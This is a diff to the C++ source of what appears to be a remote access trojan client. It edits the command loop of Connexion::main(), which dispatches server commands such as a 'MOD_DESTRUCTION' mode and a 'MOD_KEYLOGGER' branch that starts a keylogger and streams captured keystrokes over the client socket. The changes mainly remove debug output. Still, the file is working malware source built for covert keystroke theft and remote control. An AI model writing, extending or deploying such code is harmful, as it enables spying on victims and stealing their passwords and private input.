@@ -63,7 +63,6 @@ INT Connexion::main()
         {
             ;
             //if find is_life then continue
-            //wcout << "life baby " << endl;   
         }
         else
         {
@@ -152,7 +151,6 @@ INT Connexion::main()
                     status = L"MOD_DESTRUCTION:" SPLIT  "False";//"[+] The destruction mode is executed successfully.";
                 }  
 
-
                 if(command.substr(16,7) == L"default") //6 for default
                 {
                     //if default then send status at server. 
@@ -171,22 +169,17 @@ INT Connexion::main()
 
             else if(command.substr(0,14) == L"MOD_KEYLOGGER:")
             {
-
-                wcout << "mod keylogger \n\n" << endl;
-                wcout << "Socket address: " << &sock_client << endl;
-                wcout << "Value: " << sock_client << endl;
-
+                wcout << "MOD_KEYLOGGER" << endl;
                 Keylogger keylogger;
                 keylogger.setup();
                 keylogger.setSocket(sock_client);
                 
                 if(command.substr(14, 10) == L"direct_tcp")
                 {
-                    wcout << "direct_tp !!!!!!!\n" << endl;
-                    int stat = send(sock_client, (char *)L"hello2", sizeof(L"hello2"), 0);
-                    //wcout << "stat2: " << stat << endl;
                     keylogger.directTcp();
+                    wcout << "in Connexion !" << endl;
                 } 
+                //keylogger.~Keylogger();
             }
             
             else
@@ -323,6 +316,7 @@ VOID Connexion::setToken(wstring token)
     }
     
 }
+
 
 VOID Connexion::setIsAdmin(BOOL is_admin)
 {
